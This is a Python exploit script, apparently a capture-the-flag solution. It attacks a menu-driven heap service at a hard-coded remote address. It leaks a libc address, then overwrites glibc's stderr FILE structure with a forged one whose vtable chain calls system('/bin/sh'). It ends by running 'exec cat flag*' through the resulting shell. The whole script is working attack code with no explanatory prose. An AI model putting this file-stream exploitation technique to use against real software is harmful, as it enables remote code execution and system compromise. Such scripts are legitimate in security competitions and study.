from time import *
from ptrlib import *
from subprocess import getoutput
from sys import argv, exit

libc = ELF("./libc.so.6")

is_remote = len(argv) >= 2

if is_remote:
  p = Socket('3.87.229.177', 33337)
  libc_addr = 0x0
else :
  p = Socket('localhost', 33337)
  sleep(1)
  cmd = getoutput("ps aux | grep /app/ru[n]")
  print(repr(cmd))
  while cmd.find('  ') != -1:
    cmd = cmd.replace('  ', ' ')
  print(repr(cmd))
  print(cmd.split(' '))
  mp = cmd.split(' ')[1]
  mp = getoutput("cat /proc/{}/maps".format(mp))
  print(mp)
  for l in mp.split('\n'):
    if not l:
      continue
    if 'libc.so.6' in l:
      libc_addr = int(l.split('-')[0], 16)
      break

p.recvuntil('Enter command: ')
p.sendline('1')
p.sendline('0')
p.sendline('8')
p.sendline('--0')

p.recvuntil('Enter command: ')
p.sendline('1')
p.sendline('2')
p.sendline('0')
p.sendline('0')
p.sendline('3')
p.sendline('A')

p.recvuntil('Enter command: ')
p.sendline('2')
p.recvuntil('RUNNING\nHash: ')

addr = int(p.recvline(), 16)
if addr == 0x8000000000000006:
  print("failed")
  exit(1)

print(f'addr: {hex(addr)}')
print(f'libc: {hex(libc_addr)}')
print(f'diff: {hex(addr - libc_addr)}')

libc.base = addr - 0x87dda

p.recvuntil('Enter command: ')
p.sendline('1')
p.sendline('1')
p.sendline('0')
p.sendline('0')
p.sendline(str(0x1000000))
p.sendline('A')
p.recvuntil('Enter command: ')

while 1:
  p.sendline('2')
  res = p.recvuntil('Enter command: ')
  print(res)

  if b'#1 - BUFFER READY' in res:
    break

sleep(3)

p.sendline('1')
p.sendline('2')
p.sendline('0')
p.sendline(str(libc.symbol('_IO_2_1_stderr_')))

fake_file = flat([
    0x3b01010101010101, u64(b"/bin/sh\0"), # flags / rptr
    0, 0, # rend / rbase
    0, 1, # wbase / wptr
    0, 0, # wend / bbase
    0, 0, # bend / savebase
    0, 0, # backupbase / saveend
    0, 0, # marker / chain
], map=p64)
fake_file += p64(libc.symbol("system")) # __doallocate
fake_file += b'\x00' * (0x88 - len(fake_file))
fake_file += p64(libc.base + 0x205710) # lock
fake_file += b'\x00' * (0xa0 - len(fake_file))
fake_file += p64(libc.symbol("_IO_2_1_stderr_")) # wide_data
fake_file += b'\x00' * (0xd8 - len(fake_file))
fake_file += p64(libc.base + 0x202228) # vtable (_IO_wfile_jumps)
fake_file += p64(libc.symbol("_IO_2_1_stderr_") + 8) # _wide_data->_wide_vtable
assert not b'\n' in fake_file

p.sendline(str(len(fake_file)))
p.send(fake_file)

p.sendline('2')

sleep(60)
print('retrieve')

out = 0
cnt = 0
while 1:
  res = p.recv(4096)
  out += len(res)
  cnt += 1
  if cnt%100 == 0:
    print(out)

  found = False
  for c in res:
    if c != b'0'[0]:
      print(res)
      found = True
      break

  if found and b'Timed out' in res:
    break

while 1:
  p.sendline('exec cat flag*')
  print(p.recv(1024))

